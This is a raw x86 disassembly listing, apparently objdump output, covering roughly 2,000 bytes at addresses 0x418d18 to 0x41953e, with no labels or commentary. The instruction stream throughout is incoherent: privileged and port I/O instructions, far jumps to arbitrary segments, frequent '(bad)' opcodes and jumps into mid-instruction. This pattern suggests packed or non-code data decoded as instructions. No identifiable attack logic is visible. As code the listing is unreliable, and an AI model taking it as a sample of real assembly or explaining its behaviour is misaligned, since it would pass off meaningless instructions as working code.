  418d18:	lds    esp,FWORD PTR ds:0x3e545297
  418d1e:	fnstcw WORD PTR [eax-0x5c]
  418d21:	pop    ebp
  418d22:	or     edx,DWORD PTR [ebp-0x271fca4d]
  418d28:	jg     0x418cc2
  418d2a:	add    bl,ch
  418d2c:	jno    0x418ccb
  418d2e:	mov    ds:0x9d946cf,eax
  418d33:	and    cl,cl
  418d35:	mov    ss:0xbced65cc,al
  418d3b:	sti    
  418d3c:	bound  edx,QWORD PTR [edi]
  418d3e:	mov    cl,BYTE PTR [esi-0x55]
  418d41:	aas    
  418d42:	jne    0x418d6c
  418d44:	inc    edi
  418d45:	xor    esp,0xffffffb5
  418d48:	out    dx,al
  418d49:	sbb    BYTE PTR [edx-0x5e],ah
  418d4c:	cmp    BYTE PTR ds:0xcc9610b9,ah
  418d52:	mov    dl,0x6a
  418d54:	daa    
  418d55:	stos   BYTE PTR es:[edi],al
  418d56:	adc    eax,0x279f5308
  418d5b:	or     al,0x7c
  418d5d:	sbb    esp,DWORD PTR [ecx+0x5d69b70a]
  418d63:	xor    edi,DWORD PTR [ebx]
  418d65:	out    dx,al
  418d66:	mov    ds:0x24323405,al
  418d6b:	daa    
  418d6c:	leave  
  418d6d:	add    al,0xb4
  418d6f:	add    eax,0xd5bc7c49
  418d74:	pushf  
  418d75:	rcl    edi,0xdb
  418d78:	push   esi
  418d79:	push   cs
  418d7a:	into   
  418d7b:	jbe    0x418d70
  418d7d:	xor    DWORD PTR [eax+eax*4-0x3cd987d8],0xfffffffd
  418d85:	xchg   ebx,eax
  418d86:	mov    eax,0x21a89e9e
  418d8b:	fucomip st,st(0)
  418d8d:	mov    edx,edi
  418d8f:	and    eax,eax
  418d91:	es test eax,0x41e4a99d
  418d97:	jae    0x418d3d
  418d99:	addr16 inc eax
  418d9b:	xlat   BYTE PTR ds:[ebx]
  418d9c:	ins    BYTE PTR es:[edi],dx
  418d9d:	ins    DWORD PTR es:[edi],dx
  418d9e:	push   es
  418d9f:	mov    al,ds:0xc0bd6225
  418da4:	jns    0x418da1
  418da6:	jmp    0x418dc4
  418da8:	xor    BYTE PTR [ebp+0x68],bh
  418dab:	dec    esi
  418dac:	fdiv   DWORD PTR [esi]
  418dae:	std    
  418daf:	popf   
  418db0:	inc    ecx
  418db1:	das    
  418db2:	push   0x74548b27
  418db7:	cmp    esi,DWORD PTR [esi+0x35]
  418dba:	sti    
  418dbb:	dec    ebp
  418dbc:	lods   al,BYTE PTR ds:[esi]
  418dbd:	mov    esp,0x8f7ac756
  418dc2:	and    eax,0x407af4b4
  418dc7:	lock addr16 (bad) 
  418dca:	fdivr  DWORD PTR [esi]
  418dcc:	mov    ch,bh
  418dce:	and    al,BYTE PTR [ecx+0x3]
  418dd1:	xlat   BYTE PTR ds:[ebx]
  418dd2:	cmp    DWORD PTR [edx-0x5f],esi
  418dd5:	sub    al,0xc5
  418dd7:	xchg   ecx,eax
  418dd8:	xchg   ecx,eax
  418dd9:	rep stos DWORD PTR es:[edi],eax
  418ddb:	fistp  WORD PTR [esp+edx*2+0x1b4a4d29]
  418de2:	cmc    
  418de3:	sete   BYTE PTR [ebx+0x27249375]
  418dea:	out    0xb2,al
  418dec:	push   ebp
  418dee:	mov    edx,eax
  418df0:	(bad)  
  418df1:	mov    al,ds:0x3b1a1c43
  418df6:	loopne 0x418ded
  418df8:	or     ebx,DWORD PTR [ebp+0x9999887]
  418dfe:	scas   al,BYTE PTR es:[edi]
  418dff:	mov    ds:0x354d2d0b,al
  418e04:	dec    ebx
  418e05:	or     BYTE PTR [esi-0x6ede868a],bl
  418e0b:	imul   DWORD PTR [esi+0x5e]
  418e0e:	mov    bh,BYTE PTR [edi+0x66]
  418e11:	sbb    eax,0x10617e59
  418e16:	mov    dh,0xb1
  418e18:	retf   0xd13f
  418e1b:	mov    al,ds:0x1b03079
  418e20:	add    BYTE PTR [ebp+0x1dc64ff5],bh
  418e26:	(bad)
  418e2a:	mov    bh,0x7c
  418e2c:	inc    esi
  418e2d:	xor    edx,DWORD PTR [edx+0x49ff893e]
  418e33:	shl    DWORD PTR [esi+ebx*1],1
  418e36:	inc    ebp
  418e37:	pop    ds
  418e38:	mov    al,ds:0x64e18ac6
  418e3d:	push   edx
  418e3e:	popf   
  418e3f:	test   BYTE PTR [edx+eax*8],0x44
  418e43:	jecxz  0x418e28
  418e45:	cmp    DWORD PTR [edx-0x78],ecx
  418e48:	ja     0x418e7b
  418e4a:	xor    al,0x82
  418e4c:	mov    dl,0x41
  418e4e:	and    BYTE PTR ds:[edi+ebx*8-0x44e361a0],ah
  418e56:	loopne 0x418e66
  418e58:	ror    ch,1
  418e5a:	int    0x31
  418e5c:	xchg   edi,eax
  418e5d:	jp     0x418ea2
  418e5f:	inc    edi
  418e60:	pop    ebp
  418e61:	add    DWORD PTR [edx-0x47],edi
  418e64:	xlat   BYTE PTR ds:[ebx]
  418e65:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418e67:	xchg   edi,eax
  418e68:	jno    0x418e61
  418e6a:	sbb    eax,0x1fa81c50
  418e6f:	repz push cs
  418e71:	pop    ds
  418e72:	mov    dl,0xf8
  418e74:	rcl    cl,cl
  418e76:	push   es
  418e77:	push   cs
  418e78:	leave  
  418e79:	jnp    0x418e05
  418e7b:	mov    eax,ds:0xf0635c23
  418e80:	xchg   edx,eax
  418e81:	or     ch,BYTE PTR [ebx]
  418e83:	sbb    BYTE PTR [eax],0xa6
  418e86:	mov    bl,0x1
  418e88:	jg     0x418e45
  418e8a:	je     0x418e88
  418e8c:	sub    DWORD PTR [ebx+edi*4-0x735c67f1],edi
  418e93:	gs jp  0x418ef2
  418e96:	or     eax,0x43f04a1a
  418e9b:	sahf   
  418e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e9d:	sbb    DWORD PTR [edi+0x38],edx
  418ea0:	test   al,0x16
  418ea2:	mov    al,es:0xc3515c51
  418ea8:	fs je  0x418e6a
  418eab:	inc    edx
  418eac:	stos   DWORD PTR es:[edi],eax
  418ead:	sbb    esi,DWORD PTR fs:[esi]
  418eb0:	les    eax,FWORD PTR ds:0x61562163
  418eb6:	pop    ecx
  418eb7:	aad    0x59
  418eb9:	jo     0x418efa
  418ebb:	push   0x65dfc6e8
  418ec0:	xchg   edx,eax
  418ec1:	jl     0x418e95
  418ec3:	fwait
  418ec4:	push   esi
  418ec5:	mov    ds:0x4ca0ce44,al
  418eca:	add    edx,DWORD PTR [ebx+0xfdb18da]
  418ed0:	ret    0x1061
  418ed3:	inc    esp
  418ed4:	test   al,0x43
  418ed6:	add    DWORD PTR [esp+eax*2-0x2d71615e],ebp
  418edd:	out    0x30,al
  418edf:	ins    DWORD PTR es:[edi],dx
  418ee0:	loopne 0x418e8c
  418ee2:	stos   DWORD PTR es:[edi],eax
  418ee3:	push   ecx
  418ee4:	and    DWORD PTR [eax+0x16],0x57d1292b
  418eeb:	mov    edx,DWORD PTR [esi+0x6bae3d8f]
  418ef1:	push   edx
  418ef2:	neg    DWORD PTR [edx+0x7d]
  418ef5:	shr    bl,cl
  418ef7:	or     ebx,edx
  418ef9:	sar    bh,cl
  418efb:	outs   dx,BYTE PTR ds:[esi]
  418efc:	push   eax
  418efd:	pop    edi
  418efe:	xchg   DWORD PTR [esi+edx*2+0x1f],edx
  418f02:	inc    edx
  418f03:	jmp    0x418ec2
  418f05:	xlat   BYTE PTR ds:[ebx]
  418f06:	cli    
  418f07:	cmp    ah,BYTE PTR [edx-0x5e74531e]
  418f0d:	sbb    eax,0x9ed97b2d
  418f12:	jno    0x418f85
  418f14:	sub    eax,0x7a947b72
  418f19:	xor    cl,dh
  418f1b:	mov    ebx,0xbc848666
  418f20:	or     BYTE PTR [edi-0x59],bh
  418f23:	(bad)  
  418f24:	scas   eax,DWORD PTR es:[edi]
  418f25:	pop    esp
  418f26:	cs ds ret 0x4992
  418f2b:	push   esp
  418f2c:	out    0x7e,al
  418f2e:	or     DWORD PTR [edi+eiz*4+0x63],ecx
  418f32:	jmp    0x22b7:0x1d5bbe37
  418f39:	mov    bh,0x4b
  418f3b:	adc    ebx,DWORD PTR [ecx+0x8]
  418f3e:	cs (bad) 
  418f40:	shl    bh,0x79
  418f43:	jge    0x418f43
  418f45:	les    edx,FWORD PTR [esi]
  418f47:	add    esp,ecx
  418f49:	leave  
  418f4a:	stos   BYTE PTR es:[edi],al
  418f4b:	jmp    0xaa1b2b87
  418f50:	pop    ebx
  418f51:	adc    ebx,DWORD PTR [edi-0x70]
  418f54:	out    0xfa,eax
  418f56:	jg     0x418fad
  418f58:	ins    DWORD PTR es:[edi],dx
  418f59:	outs   dx,DWORD PTR ds:[esi]
  418f5a:	sbb    DWORD PTR [edx],edx
  418f5c:	push   edi
  418f5d:	jmp    0x43d4:0x86a3aadb
  418f64:	and    BYTE PTR ds:0x7d45bf7b,bh
  418f6a:	add    bh,BYTE PTR [ecx+0x8]
  418f6d:	jo     0x418f07
  418f6f:	imul   ecx,DWORD PTR [ebx+0x5a35ab2d],0xffffffca
  418f76:	push   ds
  418f77:	rcl    BYTE PTR [ecx-0x45],0xf7
  418f7b:	jnp    0x418fcb
  418f7d:	test   DWORD PTR [ecx],esi
  418f7f:	loopne 0x418f38
  418f81:	ins    BYTE PTR es:[edi],dx
  418f82:	mov    al,0x2a
  418f84:	js     0x418f30
  418f86:	mov    esp,0x48709d80
  418f8b:	lds    esi,FWORD PTR [edx-0x84a6265]
  418f91:	in     al,0x5f
  418f93:	call   0x11136b4b
  418f98:	jmp    0x418fa4
  418f9a:	mov    bl,0x5b
  418f9c:	lea    ecx,[edx+0x28]
  418f9f:	call   0xd4ea:0xb4982257
  418fa6:	subps  xmm0,XMMWORD PTR [esp+edi*8+0x66b579d]
  418fae:	aam    0xea
  418fb0:	cmp    BYTE PTR [esi-0x2851a7ce],dh
  418fb6:	cmp    BYTE PTR [esi-0x77158659],dh
  418fbc:	cmp    DWORD PTR cs:[eax],edx
  418fbf:	mov    dl,0x1
  418fc1:	ret    0xc469
  418fc4:	mov    BYTE PTR [edi+0x617343a7],bh
  418fca:	out    dx,eax
  418fcb:	addr16 add eax,0xdf3f0ae8
  418fd1:	xchg   esi,eax
  418fd2:	mov    eax,0xef574247
  418fd7:	in     eax,0xd0
  418fd9:	sbb    ah,cl
  418fdb:	pop    edi
  418fdc:	mov    eax,0xb4e57df1
  418fe1:	and    DWORD PTR [ebx-0xe8e09b6],eax
  418fe7:	cmp    al,0x71
  418fe9:	push   ecx
  418fea:	mov    BYTE PTR [edx+0x4],bl
  418fed:	(bad)  es:[edx-0x7c]
  418ff1:	mov    eax,0x22c83a18
  418ff6:	ins    BYTE PTR es:[edi],dx
  418ff7:	inc    DWORD PTR [esi-0x537410a4]
  418ffd:	(bad)  
  418ffe:	push   edx
  418fff:	sub    ah,BYTE PTR [eax+0x46656c0c]
  419005:	inc    ecx
  419006:	push   edi
  419007:	pop    edi
  419008:	or     ah,BYTE PTR [ebx]
  41900a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41900b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41900c:	in     eax,dx
  41900d:	std    
  41900e:	test   ecx,ebp
  419010:	retf   0x25a7
  419013:	jg     0x419090
  419015:	lds    ebp,FWORD PTR [ebx+0x665df555]
  41901b:	pop    es
  41901c:	or     DWORD PTR [edi+eax*1],esp
  41901f:	ror    edi,cl
  419021:	sub    eax,0x35b75642
  419026:	dec    ebx
  419027:	mov    dl,0x52
  419029:	call   0xa4dc615
  41902e:	pop    ds
  41902f:	or     BYTE PTR [ecx+eax*8-0x18],0x7f
  419034:	and    eax,0x7e466a9f
  419039:	mov    eax,ds:0xc5ae9ffe
  41903e:	dec    ebx
  41903f:	xchg   esp,eax
  419040:	push   ss
  419041:	jbe    0x419073
  419043:	loop   0x418ff2
  419045:	aad    0x59
  419047:	lock popa 
  419049:	xor    ah,BYTE PTR [ecx+0x32]
  41904c:	aam    0x8e
  41904e:	retf   0x96a
  419051:	pushf  
  419052:	xor    esp,esp
  419054:	test   eax,0xb301f457
  419059:	dec    edi
  41905a:	retf   0x8692
  41905d:	or     eax,0x771224a1
  419062:	pusha  
  419063:	jno    0x4190e3
  419065:	fistp  DWORD PTR [ecx]
  419067:	sahf   
  419068:	jno    0x419073
  41906a:	dec    ebp
  41906b:	call   0x1755d06f
  419070:	ficomp WORD PTR [eax+ecx*4+0x58d291b3]
  419077:	add    DWORD PTR [esi],ebx
  419079:	sub    dl,ah
  41907b:	in     eax,0x10
  41907d:	dec    edx
  41907e:	sbb    bh,BYTE PTR [eax-0x4e]
  419081:	pop    ebp
  419082:	aad    0x9b
  419084:	adc    al,0x59
  419086:	sub    eax,0x88e43784
  41908b:	adc    al,0xa6
  41908d:	test   DWORD PTR [ebx-0x51],0xe257297e
  419094:	sub    BYTE PTR [ebp-0x12df60e9],ch
  41909a:	sbb    eax,0xb710e12c
  41909f:	lds    edi,FWORD PTR fs:[ecx+0x217096c0]
  4190a6:	cdq    
  4190a7:	mov    eax,ds:0xd57faf2
  4190ac:	push   ds
  4190ad:	das    
  4190ae:	das    
  4190af:	xchg   ebx,eax
  4190b0:	xor    eax,0x3dbb5bbe
  4190b5:	lods   al,BYTE PTR ds:[esi]
  4190b6:	outs   dx,BYTE PTR ds:[esi]
  4190b7:	cmp    al,0x76
  4190b9:	sub    ah,BYTE PTR [ecx]
  4190bb:	ss (bad) 
  4190bd:	(bad)  
  4190bf:	pop    edx
  4190c0:	jbe    0x4190e9
  4190c2:	loop   0x4190b8
  4190c4:	mov    esi,0x38609b51
  4190c9:	cmp    cl,BYTE PTR [eax+0x67c188f6]
  4190cf:	lahf   
  4190d0:	inc    ebp
  4190d1:	sub    edi,DWORD PTR [ecx]
  4190d3:	lahf   
  4190d4:	pushf  
  4190d5:	jo     0x41908f
  4190d7:	mov    bl,0x68
  4190d9:	or     DWORD PTR [ebx-0xbedc9c7],esi
  4190df:	js     0x4190fa
  4190e1:	in     eax,dx
  4190e2:	imul   esi,DWORD PTR [esi+esi*8-0x6f40557c],0x9c8318c1
  4190ed:	sbb    bh,BYTE PTR [esp+edi*8+0x66]
  4190f1:	mov    ds:0x9686f51c,al
  4190f6:	(bad)  
  4190f7:	jecxz  0x419158
  4190f9:	jno    0x4190d3
  4190fb:	sub    DWORD PTR [esi],ebx
  4190fd:	scas   eax,DWORD PTR es:[edi]
  4190fe:	mov    al,0x9f
  419100:	sbb    esp,DWORD PTR [esi+0x662d323e]
  419106:	call   DWORD PTR [edi+0x36]
  419109:	scas   al,BYTE PTR es:[edi]
  41910a:	call   0x4c5590ee
  41910f:	jo     0x419136
  419111:	retf   0xaca0
  419114:	pop    esi
  419115:	stos   DWORD PTR es:[edi],eax
  419116:	adc    eax,0x56ccb734
  41911b:	loope  0x419111
  41911d:	pop    ecx
  41911e:	mov    al,ds:0x7def2c0
  419123:	jl     0x419183
  419125:	add    al,0x5e
  419127:	sub    bh,BYTE PTR [edi+0x46]
  41912a:	jmp    0x7b49:0x5056b059
  419131:	pusha  
  419132:	xchg   esp,eax
  419133:	mov    al,ds:0x941f61fa
  419138:	or     BYTE PTR [eax*1-0x29471fe8],cl
  41913f:	or     eax,0x39b98f0b
  419144:	std    
  419145:	mov    edi,DWORD PTR [esi-0x30227dab]
  41914b:	xchg   edi,eax
  41914c:	add    DWORD PTR [eax+0x466c5e37],ebx
  419152:	scas   eax,DWORD PTR es:[edi]
  419153:	popf   
  419154:	int3   
  419155:	test   DWORD PTR [ebp-0x24],esp
  419158:	and    al,0x27
  41915a:	(bad)  
  41915b:	retf   
  41915c:	rcl    BYTE PTR [edi+0xe21b68b],0xe5
  419163:	(bad)  
  419164:	dec    ecx
  419165:	outs   dx,BYTE PTR ds:[esi]
  419166:	sar    DWORD PTR [edi+edi*8+0x35466197],1
  41916d:	call   0x34c6:0x2a1b9254
  419174:	sahf   
  419175:	xchg   ebx,eax
  419176:	std    
  419177:	mov    al,0xab
  419179:	sbb    eax,0xef2e2fb2
  41917e:	imul   esi,edx,0x3
  419181:	ins    BYTE PTR es:[edi],dx
  419182:	adc    dh,BYTE PTR [ebx-0x7e]
  419185:	mov    BYTE PTR [esi+0x50de877b],cl
  41918b:	dec    edi
  41918c:	iret   
  41918d:	and    esp,edi
  41918f:	cmp    DWORD PTR [eax-0x4601bfc],0xd60af001
  419199:	jno    0x419193
  41919b:	lds    edx,FWORD PTR [ecx+0x19565ead]
  4191a1:	in     al,0x42
  4191a3:	shr    DWORD PTR [edx],cl
  4191a5:	imul   edx,edi,0x217ae377
  4191ab:	inc    eax
  4191ac:	lea    eax,[ebx]
  4191ae:	retf   
  4191af:	and    DWORD PTR [eax],esp
  4191b1:	sub    BYTE PTR [ebx-0xde641a8],al
  4191b7:	mov    eax,0x7cc7cd9d
  4191bc:	(bad)  
  4191bd:	xchg   ebx,eax
  4191be:	xlat   BYTE PTR ds:[ebx]
  4191bf:	mov    dl,0xdb
  4191c1:	icebp  
  4191c2:	outs   dx,BYTE PTR ds:[esi]
  4191c3:	stc    
  4191c4:	std    
  4191c5:	sub    ebp,edx
  4191c7:	pop    esp
  4191c8:	addr16 in al,0x4
  4191cb:	adc    BYTE PTR [ecx],ch
  4191cd:	shl    cl,cl
  4191cf:	jmp    0xb2197705
  4191d4:	cld    
  4191d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d6:	adc    ebp,edx
  4191d8:	xor    DWORD PTR [edx-0x3b801721],ebx
  4191de:	push   ecx
  4191df:	xchg   edx,eax
  4191e0:	push   edx
  4191e1:	popf   
  4191e2:	xchg   ebp,eax
  4191e4:	out    0x73,al
  4191e6:	fsubr  QWORD PTR ss:[ebp+0x34eb73de]
  4191ed:	pop    ebp
  4191ee:	xor    eax,DWORD PTR ds:0xb6cc4b76
  4191f4:	test   BYTE PTR [ebx+0x2a],ch
  4191f7:	sub    DWORD PTR [edi-0x789d8c25],ebp
  4191fd:	shl    BYTE PTR [ebx-0x35],0x27
  419201:	mov    ah,al
  419203:	sbb    eax,0xb8cbaaf5
  419208:	xchg   edi,eax
  419209:	cmp    al,0x3f
  41920b:	pop    eax
  41920c:	xor    eax,0x952170f8
  419211:	or     DWORD PTR [edx-0x5886cac6],ecx
  419217:	pop    edx
  419218:	sub    esi,ebx
  41921a:	stc    
  41921b:	dec    BYTE PTR [ebx+0x73b7fa71]
  419221:	out    0x7a,eax
  419223:	and    bl,BYTE PTR [ecx]
  419225:	inc    edi
  419226:	loope  0x419242
  419228:	sbb    al,BYTE PTR ds:0x621d7f1a
  41922e:	imul   esp,DWORD PTR [esi],0x20
  419231:	bound  edx,QWORD PTR [edi]
  419233:	sub    BYTE PTR [ebx+0x31],bh
  419236:	jp     0x4191cb
  419238:	stc    
  419239:	add    al,0x3b
  41923b:	add    ch,bh
  41923d:	icebp  
  41923e:	mov    ah,0x2f
  419240:	cmp    eax,0x44a14a69
  419245:	bound  ebx,QWORD PTR [edi+0x2b8808f8]
  41924b:	xor    ecx,ebx
  41924d:	enter  0x7b23,0xff
  419251:	(bad)  
  419253:	dec    edx
  419254:	ja     0x419249
  419256:	out    0x41,al
  419258:	cmp    esi,DWORD PTR [edi+0x51]
  41925b:	pop    ecx
  41925c:	call   0x683:0x5ebd220b
  419263:	fimul  WORD PTR [eax+0x532d2668]
  419269:	dec    edx
  41926a:	fild   DWORD PTR ds:0xd058cb25
  419270:	shl    DWORD PTR [ebp+0x1cc9a7b8],cl
  419276:	sar    bh,0x4b
  419279:	sbb    BYTE PTR [edx-0x20],al
  41927c:	push   esi
  41927d:	ds je  0x4192ee
  419280:	xor    DWORD PTR [edx+0x5169be57],edx
  419286:	dec    eax
  419287:	ins    DWORD PTR es:[edi],dx
  419288:	and    edi,DWORD PTR [ebx-0x78]
  41928b:	gs pop edi
  41928d:	jp     0x41929f
  41928f:	dec    edi
  419290:	loope  0x4192df
  419292:	dec    ebp
  419293:	jle    0x4192ac
  419295:	inc    edx
  419296:	popf   
  419297:	inc    ebp
  419298:	push   ss
  419299:	imul   ecx,DWORD PTR [eax-0x33],0xb4d0bd1
  4192a0:	out    dx,eax
  4192a1:	pop    ebx
  4192a2:	dec    edi
  4192a3:	loope  0x4192e7
  4192a5:	cld    
  4192a6:	cli    
  4192a7:	rol    DWORD PTR [ecx+0x5b],1
  4192aa:	mov    ah,0xca
  4192ac:	and    eax,0xc7c157fb
  4192b1:	xlat   BYTE PTR ds:[ebx]
  4192b2:	retf   0xf1a8
  4192b5:	(bad)  
  4192b6:	pushf  
  4192b7:	bound  esp,QWORD PTR [ecx+ebp*1-0x7a140d9b]
  4192be:	call   0x247e:0xdce0d9b2
  4192c5:	xchg   esi,eax
  4192c6:	icebp  
  4192c7:	or     eax,0xda1c06d4
  4192cc:	pop    ebp
  4192cd:	ret    0x41ee
  4192d0:	xchg   BYTE PTR [ecx-0x42],al
  4192d3:	fisub  DWORD PTR ds:0xa11e19e4
  4192d9:	je     0x419341
  4192db:	jl     0x4192ad
  4192dd:	push   ds
  4192de:	jnp    0x41928e
  4192e0:	xchg   esp,eax
  4192e1:	loope  0x419304
  4192e3:	mov    ebp,0x8f2b9bc8
  4192e8:	jecxz  0x4192b4
  4192ea:	xor    bh,BYTE PTR [edi-0x75]
  4192ed:	adc    DWORD PTR [edi-0x6e],esp
  4192f0:	hlt    
  4192f1:	pusha  
  4192f2:	fistp  QWORD PTR [ecx]
  4192f4:	sbb    BYTE PTR [edi+0x54],0x27
  4192f8:	pop    es
  4192f9:	cmp    esp,edi
  4192fb:	fs lock inc esp
  4192fe:	and    esi,ebp
  419300:	out    0xc,eax
  419302:	add    DWORD PTR [edi+0x8],ebx
  419305:	sub    BYTE PTR [ebp-0x35a4575e],al
  41930b:	push   ebp
  41930c:	or     ch,BYTE PTR [eax+0x4b4759d5]
  419312:	push   0xffffff85
  419314:	mov    al,ds:0x8302b5d7
  419319:	mov    al,ds:0xaf0902c7
  41931e:	daa    
  41931f:	pop    ebx
  419320:	dec    edx
  419321:	(bad)  
  419323:	adc    DWORD PTR [edi-0xc],esi
  419326:	jg     0x419363
  419328:	stc    
  419329:	dec    ebp
  41932a:	lods   eax,DWORD PTR ds:[esi]
  41932b:	clc    
  41932c:	and    BYTE PTR [ebp+0x3893d9a9],0xab
  419333:	push   cs
  419334:	push   ds
  419335:	int3   
  419336:	enter  0xd63a,0x43
  41933a:	and    eax,0xffafa430
  41933f:	xchg   ebp,eax
  419340:	fisub  WORD PTR [ebx-0x79]
  419343:	sub    ebx,ebx
  419345:	add    BYTE PTR [ebp+0x7a],al
  419348:	das    
  419349:	mov    cl,0x95
  41934b:	dec    esi
  41934c:	add    dl,BYTE PTR [ebx-0xa37704b]
  419352:	ins    DWORD PTR es:[edi],dx
  419353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419354:	ss push ds
  419356:	enter  0xbc82,0xe8
  41935a:	ja     0x419306
  41935c:	hlt    
  41935d:	bound  eax,QWORD PTR [edx+0x31]
  419360:	and    dl,BYTE PTR [ebx]
  419362:	mov    al,0xef
  419364:	loope  0x4193c4
  419366:	out    0x3c,al
  419368:	loopne 0x419332
  41936a:	popa   
  41936b:	add    al,0x67
  41936d:	mov    eax,0x7a0c6e5d
  419372:	dec    eax
  419373:	call   0x7b8d5fda
  419378:	push   cs
  419379:	ror    DWORD PTR [ebp+0x4b],1
  41937c:	sbb    eax,DWORD PTR [edi-0x54]
  41937f:	test   BYTE PTR [eax+0x1f27f50c],0x88
  419386:	xchg   ebp,eax
  419387:	adc    al,0xc0
  419389:	xchg   BYTE PTR [eax+0x53ac8b54],dl
  41938f:	aad    0x63
  419391:	cmp    ah,BYTE PTR [edi+0x15e6b64e]
  419397:	push   ss
  419398:	mov    al,0x93
  41939a:	mov    edx,0x5bbd9fc8
  41939f:	push   ecx
  4193a0:	ror    DWORD PTR [ebp+0x38],1
  4193a3:	in     eax,0x1a
  4193a5:	dec    ecx
  4193a6:	sbb    eax,0x2645a04a
  4193ab:	cmc    
  4193ac:	out    0x1d,al
  4193ae:	sub    ebx,DWORD PTR [edi]
  4193b0:	mov    ds:0xbc8d6bb1,al
  4193b5:	mov    dh,0xb
  4193b7:	mov    eax,0xcb8847ed
  4193bc:	rol    DWORD PTR [edx+0x1d],1
  4193bf:	fisttp DWORD PTR [ebx+0x6124e57e]
  4193c5:	aaa    
  4193c6:	adc    al,0x2c
  4193c8:	dec    eax
  4193c9:	repnz push esi
  4193cb:	imul   eax,DWORD PTR [edx-0x6c],0x13
  4193cf:	mov    ecx,0xbce1b782
  4193d4:	js     0x41937e
  4193d6:	rsm    
  4193d8:	out    0x9a,eax
  4193da:	sub    BYTE PTR [edx+eiz*2-0x59],ah
  4193de:	xor    edi,esp
  4193e0:	inc    esi
  4193e1:	mov    ds:0x8c04b5a9,eax
  4193e6:	imul   edi,DWORD PTR ds:0x97c08168,0xbfc4ccc4
  4193f0:	mov    edi,0x47240f04
  4193f5:	jbe    0x4193ca
  4193f7:	xor    al,0x33
  4193f9:	mov    al,0x93
  4193fb:	in     al,0xd1
  4193fd:	sub    dl,BYTE PTR [edx+0x3f265cac]
  419403:	adc    eax,0x91d4e10d
  419408:	jb     0x419484
  41940a:	js     0x4193b1
  41940c:	daa    
  41940d:	pushf  
  41940e:	mov    bl,0xfb
  419410:	shl    DWORD PTR [edi-0x6f],0xea
  419414:	test   DWORD PTR [ebx],0x4ef31955
  41941a:	fisttp WORD PTR [esi]
  41941c:	aam    0xa3
  41941e:	xchg   esi,eax
  41941f:	imul   esp,ecx,0xf69caf74
  419425:	or     al,0x98
  419427:	test   al,0xa4
  419429:	adc    eax,0x70bcacbc
  41942e:	lahf   
  41942f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419430:	in     al,0xc
  419432:	push   edx
  419433:	aas    
  419434:	and    DWORD PTR gs:[eax-0x77bbd42b],esi
  41943b:	call   0xc15c:0xbd03931b
  419442:	or     edx,DWORD PTR [ebp+0x450dc0dc]
  419448:	ds (bad) 
  41944a:	pop    edi
  41944b:	pop    esi
  41944c:	pop    eax
  41944d:	rcl    ch,0xaa
  419450:	mov    cs,WORD PTR [ecx+0x42]
  419453:	dec    esi
  419454:	cmp    DWORD PTR ds:0x3c41e385,esi
  41945a:	bound  edi,QWORD PTR [eax]
  41945c:	sub    eax,0xc4810518
  419461:	stos   DWORD PTR es:[edi],eax
  419462:	loopne 0x419474
  419464:	test   eax,0x49699eaf
  419469:	jmp    esp
  41946b:	stc    
  41946c:	jb     0x4194ed
  41946e:	lds    eax,FWORD PTR [eax-0x61]
  419471:	xor    eax,0xafe8a659
  419476:	leave  
  419477:	adc    bl,dh
  419479:	test   eax,0x206171d0
  41947e:	pop    ds
  41947f:	nop
  419480:	imul   ecx,DWORD PTR [edx],0xf
  419483:	inc    esi
  419484:	pop    edi
  419485:	cli    
  419486:	out    dx,al
  419487:	pushf  
  419488:	mov    ch,0xae
  41948a:	aad    0xcb
  41948c:	sub    BYTE PTR [ebx-0x41],bl
  41948f:	daa    
  419490:	dec    eax
  419491:	test   BYTE PTR [edi+0x52],ah
  419494:	(bad)  
  419495:	add    esp,DWORD PTR [esp+ebx*8+0x8919f66]
  41949c:	jae    0x41947b
  41949e:	lock mov dl,0x4d
  4194a1:	sub    DWORD PTR [eax+0x18eac24e],0x21ff7034
  4194ab:	sbb    DWORD PTR [ecx+ebx*8-0x4dcfbf32],edi
  4194b2:	stos   DWORD PTR es:[edi],eax
  4194b3:	xchg   ecx,ebx
  4194b5:	adc    al,0x34
  4194b7:	imul   esp,DWORD PTR [edx-0x6f],0x656472cd
  4194be:	add    DWORD PTR [ecx],eax
  4194c0:	sub    dl,bl
  4194c2:	and    bl,BYTE PTR [esi]
  4194c4:	lds    esp,FWORD PTR [eax+0x2a]
  4194c7:	or     ecx,esi
  4194c9:	hlt    
  4194ca:	jg     0x419484
  4194cc:	mov    bl,0xeb
  4194ce:	ins    DWORD PTR es:[edi],dx
  4194cf:	jg     0x4194bd
  4194d1:	in     eax,dx
  4194d2:	push   ebp
  4194d3:	ins    DWORD PTR es:[edi],dx
  4194d4:	enter  0x395e,0xe5
  4194d8:	push   ss
  4194d9:	aam    0xeb
  4194db:	adc    edi,DWORD PTR [ebp+0x29]
  4194de:	dec    edi
  4194df:	std    
  4194e0:	ficomp DWORD PTR [eax+ebx*1-0x23]
  4194e4:	lock data16 fistp WORD PTR [eax+0x3b7b9d77]
  4194ec:	popa   
  4194ed:	fucomp st(0)
  4194ef:	jge    0x41954d
  4194f1:	adc    eax,0x5c0bd3b9
  4194f6:	sahf   
  4194f7:	std    
  4194f8:	dec    edi
  4194f9:	ret    0xd1a
  4194fc:	mul    BYTE PTR [esi-0x1b]
  4194ff:	xchg   ebp,eax
  419500:	dec    ebp
  419501:	(bad)  
  419502:	sub    BYTE PTR [eax-0x1b],bh
  419505:	xor    al,0xe3
  419507:	in     al,0x0
  419509:	(bad)  
  41950b:	mov    BYTE PTR [ecx-0x3f],bl
  41950e:	cmovs  ebx,DWORD PTR [edx+0x5f]
  419512:	add    DWORD PTR [ebp+0x69],esp
  419515:	push   0x57f2720
  41951a:	ins    DWORD PTR es:[edi],dx
  41951b:	das    
  41951c:	inc    edi
  41951d:	cmp    BYTE PTR es:[ebx-0x1e02d0dd],bl
  419524:	inc    ecx
  419525:	sbb    eax,0x91c0d70a
  41952a:	sbb    BYTE PTR [ebx-0x696d6369],ah
  419530:	push   esp
  419531:	out    0x2a,eax
  419533:	nop
  419534:	mov    dl,0x52
  419536:	aam    0x96
  419538:	mov    ebp,DWORD PTR [ecx+0x372cb1b9]
  41953e:	ins    DWORD PTR es:[edi],dx
